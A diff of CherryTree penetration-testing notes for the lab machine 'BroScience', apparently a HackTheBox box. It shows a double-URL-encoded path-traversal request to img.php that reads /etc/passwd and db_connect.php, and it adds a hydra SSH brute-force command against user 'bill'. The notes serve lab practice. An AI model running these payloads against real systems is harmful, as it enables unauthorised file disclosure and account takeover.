@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="BroScience" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675102644" ts_lastsave="1675103235">
+  <node name="BroScience" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675102644" ts_lastsave="1675266711">
     <rich_text>IP: 10.10.11.195
 OS: Debian
 tech: php
@@ -198,7 +198,9 @@ on visiting the following  </rich_text>
 
 on using the double encoded payload we dont get the error message
 
-&#13;
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>&#13;
 
 </rich_text>
       <codebox char_offset="94" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> /index.php            (Status: 200) [Size: 163423]
@@ -373,7 +375,9 @@ Connection: close</codebox>
 
 we get the following output:
 
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 from the output we see that we have a user named bill
 
@@ -385,11 +389,14 @@ so let check encoded ../../../../../var/www/html/includes/db_connect.php
 
 request:
 
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 we get the following response
 
 </rich_text>
+      <rich_text justification="left"></rich_text>
       <codebox char_offset="85" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 HTTP/1.1&#13;
 Host: broscience.htb&#13;
 Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"&#13;
@@ -488,6 +495,10 @@ if (!$db_conn) {
     die("&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database");
 }
 ?&gt;</codebox>
+    </node>
+    <node name="sshBruteforce" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675266711" ts_lastsave="1675266818">
+      <rich_text family="monospace">hydra -l bill -P /usr/share/wordlists/rockyou.txt ssh://</rich_text>
+      <rich_text>10.10.11.195</rich_text>
     </node>
   </node>
 </cherrytree>
